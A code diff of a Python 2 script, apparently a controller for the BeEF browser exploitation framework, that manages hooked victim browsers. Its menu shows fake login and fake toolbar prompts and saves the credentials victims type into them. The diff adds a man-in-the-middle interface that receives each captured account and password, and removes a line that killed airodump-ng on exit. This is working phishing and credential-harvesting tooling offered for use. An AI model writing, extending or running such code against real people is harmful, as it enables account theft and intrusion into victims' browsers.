@@ -3,13 +3,14 @@ from collections import MutableMapping
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 from browser_db_router import *
+from mitm_buffer import *
 
 
 class Browser_Parser:
 
 
 	def __init__(self):
-		self.user_id =  sys.argv[1:][0]
+		self.user_id = sys.argv[1:][0]
 		print str(self.user_id)
 		self.browser_db_router= Browser_DB_Router(self.user_id)
 		self.uname = "beef"
@@ -22,6 +23,7 @@ class Browser_Parser:
 		self.api_key = self.get_api_key()
 		self.login_promt_id = None
 		self.toolbar_prompt_id = None
+		self.interface = MITM_Interface(self.user_id)
 		self.menu()
 
 	def get_api_key(self):
@@ -42,8 +44,6 @@ class Browser_Parser:
 			socnet_choice = 'YouTube'
 		elif socnet_choice.lower() == 'generic':
 			socnet_choice = 'Generic'
-		elif socnet_choice.lower() == 'youtube':
-			socnet_choice = 'Youtube'
 		else:
 			print "please pick a social network"
 			return None
@@ -107,7 +107,7 @@ class Browser_Parser:
 			pprint.pprint(c_dict)
 			data = json.loads(c_dict['0']['data'])
 			password = str(data['data']).split(":")[1]
-			#send to password table with account as ususal
+			self.interface.read_traffic(account, password)
 			print password
 			return self.browser_db_router.update_BrowserTable_Login(self.user_id, 1)
 		except KeyError:
@@ -179,64 +179,48 @@ class Browser_Parser:
 		#get hooked browsers --> get browser details
 		return self.get_hooked_browsers()
 
-	def check_toolbars(self):
-		pass
-
-	def check_lastpass(self):
-		pass
-
-	def check_popup_blocker(self):
-		pass
-
-	def check_adblock(self):
-		pass
-
-	def check_antivirus(self):
-		pass
-
 	def menu(self):
-		print("*****BROWSER ANALYZER*****")
-		picd = True
-		while picd:
-			resp = input("please select an option number:\n" \
-							"0.See browser DB\n" \
-							"1.Save hooked browser details\n" \
-							"2.Display fake login\n"\
-							"3.Display fake toolbar\n"\
-							"4.Save fake login results\n"\
-							"5.Save fake toolbar results\n"\
-							"6.Exit\n")
-			try:
-				resp = int(resp)
-			except ValueError:
-				pass
-			if resp not in range(0,9):
-				pass
-			else:
-				picd = False
-		if resp == 0:
-			self.browser_db_router.show_browser_db(self.user_id)
-			self.menu()
-		elif resp == 1:
-			self.save_hooked_browser_details()
-			self.menu()
-		elif resp == 2:
-			self.promt_fake_login()
-			self.menu()
-		elif resp == 3:
-			self.fake_toolbar(self.redirect_url)
-			self.menu()
-		elif resp == 4:
-			account = raw_input("please select account:")
-			self.get_prompt_credentials(account)
-			self.menu()
-		elif resp == 5:
-			self.get_toolbar_result()
-			self.menu()
-		elif resp == 6:
-			os.system("sudo pkill airodump-ng && sudo pkill python") 
-			sys.exit(0)
+			print("*****BROWSER ANALYZER*****")
+			picd = True
+			while picd:
+				resp = input("please select an option number:\n" \
+								"0.See browser DB\n" \
+								"1.Save hooked browser details\n" \
+								"2.Display fake login\n"\
+								"3.Display fake toolbar\n"\
+								"4.Save fake login results\n"\
+								"5.Save fake toolbar results\n"\
+								"6.Exit\n")
+				try:
+					resp = int(resp)
+				except ValueError:
+					pass
+				if resp not in range(0,9):
+					pass
+				else:
+					picd = False
+			if resp == 0:
+				self.browser_db_router.show_browser_db(self.user_id)
+				self.menu()
+			elif resp == 1:
+				self.save_hooked_browser_details()
+				self.menu()
+			elif resp == 2:
+				self.promt_fake_login()
+				self.menu()
+			elif resp == 3:
+				self.fake_toolbar(self.redirect_url)
+				self.menu()
+			elif resp == 4:
+				account = raw_input("please select account:")
+				self.get_prompt_credentials(account)
+				self.menu()
+			elif resp == 5:
+				self.get_toolbar_result()
+				self.menu()
+			elif resp == 6:
+				sys.exit(0)
+
 
 if __name__ == "__main__":
 	bp = Browser_Parser()
-
